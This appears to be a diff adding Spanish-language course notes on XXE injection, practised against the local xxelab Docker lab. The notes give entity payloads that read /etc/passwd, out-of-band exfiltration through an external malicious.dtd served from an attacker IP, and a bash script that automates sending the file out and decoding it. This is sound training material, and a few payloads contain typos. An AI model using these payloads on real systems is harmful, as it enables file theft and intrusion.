@@ -23,3 +23,99 @@ Al explotar con éxito un SSRF, el atacante puede enviar solicitudes HTTP a serv
 A continuación, se proporciona el enlace al proyecto de Github correspondiente al laboratorio que estaremos desplegando en esta clase para practicar esta vulnerabilidad:
 
 - **XXELab**: [https://github.com/jbarone/xxelab](https://github.com/jbarone/xxelab)
+---
+- Primero clonamos el repositorio 
+```
+$ git clone https://github.com/jbarone/xxelab.git
+$ cd xxelab
+$ docker build -t xxelab .
+```
+
+- Y corremos nuestro docker en segundo plano para evitar errores
+```
+docker run -dit --rm -p 127.0.0.1:5000:80 xxelab
+```
+- Abrimos nuestro navegador por el puerto localhost:5000
+- Tambien abrimos nuestro burpsuite para ver donde viaja las direcciones al crear nuevo usuario
+- Configuramos en el apartado de repetear debajo de ?xml
+```
+<!DOCTYPE foo [<!ENTITY myName "sk8ware">]>
+``` 
+- Y debajo del apartado **email** colocar 
+```
+&myName;
+```
+- Si observamos que todo funciona correctamente podemos proceder con el XXE INJECTION con el siguiente comando debajo de ?xml
+```
+<!DOCTYPE foo [<!ENTITY myFile SYSTEM "file:///etc//passwd">]>
+```
+- De bajo de email
+```
+&miFile;
+```
+- Con esto obtendriamos la Injección XXE
+- Podriamos obtener mas información con mas gruapers, este nos muestra la información en base64
+```
+<!DOCTYPE foo [<!ENTITY myFile SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]>
+```
+
+```
+<!DOCTYPE foo [<!ENTITY myFile SYSTEM "http://192.168.72.130/testXXE">]>
+```
+- Con este gruaper nos permite ver información desde nuestro servidor http con python 
+```
+python3 -m http.server 80
+```
+- Con esto recibimos las pediciones del servidor con burpsuite
+
+- En caso que no nos permita enviar solicitudes con la entidad en la estructura lo podemos enviar en la misma línea 
+```
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.72.130/malicious.dtd">]> %xxe;]>
+```
+
+- Creamos un archivo .dtd en nuestro sistema 
+```
+nvim malicious.dtd
+```
+
+```
+<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
+<!ENTITY % eval "<!ENTITY &#X25; exfil SYSTEM 'http:///?file=%file;'>">
+%eval;
+%exfil;
+```
+- Ahora escuchamos por nuestro servidor con python 
+
+- Tambien nos podemos crear el siguiente **xxe_oob.sh** nvim para obtener datos por consola
+```
+#!/bin/bash 
+
+echo -ne "\n[+] Introduce el archivo a leer: " && read -r myFilename 
+
+malicious_dtd="""
+<!ENTITY % file SYSTEM \"php://filter/convert.base64-encode/resource=$myFilename\">
+<!ENTITY % eval \"<!ENTITY &#x25; exfil SYSTEM 'http://192.168.72.130/?file=%file;'>\">
+%eval;
+%exfil;"""
+
+echo $malicious_dtd > malicious.dtd
+ 
+python -m http.server 80 &>response &
+ 
+PID=$!
+ 
+sleep 1
+ 
+curl -s -X POST "http://localhost:5000/process.php" -d '<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://192.168.72.130:80/malicious.dtd"> %xxe;]>
+<root><name>test</name><tel>123</tel><email>a@a.com</email><password>test123</password></root>'
+ 
+cat response | grep -oP "/?file=\K[^.*\s]+" | base64 -d
+ 
+kill -9 $PID
+wait $PID 2>/dev/null
+ 
+rm response 2>/dev/null
+```
+- Con este script ya podriamos pedirle que nos enliste ciertos directorios como :
+	/etc/passwd
